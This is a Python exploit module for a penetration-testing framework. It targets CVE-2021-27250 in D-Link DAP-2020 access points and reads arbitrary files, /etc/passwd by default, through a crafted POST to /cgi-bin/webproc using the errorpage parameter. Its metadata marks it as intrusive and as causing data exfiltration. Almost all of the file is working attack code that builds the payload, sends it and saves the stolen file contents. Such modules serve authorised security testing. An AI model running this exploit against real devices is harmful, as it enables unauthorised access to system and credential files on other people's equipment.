#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""D-Link DAP-2020 webproc errorpage arbitrary file read (CVE-2021-27250)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.lfi import Lfi


class Module(Auxiliary, Http_client, Lfi):
    __info__ = {
        'name': 'D-Link DAP-2020 - webproc File Read (CVE-2021-27250)',
        'description': (
            'Reads arbitrary files from D-Link DAP-2020 via POST /cgi-bin/webproc '
            'errorpage= parameter (CVE-2021-27250).'
        ),
        'author': ['KittySploit Team'],
        'cve': ['CVE-2021-27250'],
        'platform': Platform.LINUX,
        'references': [
            'https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10201',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-27250',
        ],
        'tags': ['dlink', 'router', 'lfi', 'file-read', 'unauth', 'cve-2021-27250'],
        'agent': {
            'risk': 'intrusive',
            'effects': ['data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': True,
            'produces': ['risk_signals'],
            'cost': 1.2,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['scanner/http/cve_2021_27250_detect'],
            },
        },
    }

    file_read = OptString('/etc/passwd', 'Absolute remote file path to read', required=True)
    output_file = OptString('', 'Local file to write retrieved content', required=False)
    output_limit = OptInteger(12000, 'Max chars to print when output_file empty (0=full)', required=False, advanced=True)

    def execute(self, file_path: str) -> str:
        remote = str(file_path or '').strip()
        if not remote.startswith('/'):
            remote = '/' + remote
        from urllib.parse import quote
        data = (
            'getpage=html%2Findex.html&errorpage=' + quote(remote, safe='') +
            '&var%3Amenu=setup&var%3Apage=wizard&var%3Alogin=true&obj-action=auth&'
            '%3Ausername=admin&%3Apassword=test&%3Aaction=login&%3Asessionid=365dfaef'
        )
        r = self.http_request(
            method='POST',
            path='/cgi-bin/webproc',
            data=data,
            headers={'Content-Type': 'application/x-www-form-urlencoded'},
            allow_redirects=False,
        )
        if not r or r.status_code not in (200, 500):
            return ''
        return r.text or ''

    def run(self):
        target = str(self.file_read or '/etc/passwd')
        print_status(f'Reading {target} via webproc errorpage ...')
        body = self.execute(target)
        if not body:
            print_error('Empty response')
            return False
        out = str(self.output_file or '').strip()
        if out:
            with open(out, 'w', encoding='utf-8', errors='replace') as fh:
                fh.write(body)
            print_success(f'Wrote {len(body)} bytes to {out}')
        else:
            limit = int(self.output_limit or 0)
            print_info(body if limit <= 0 else body[:limit])
        return True
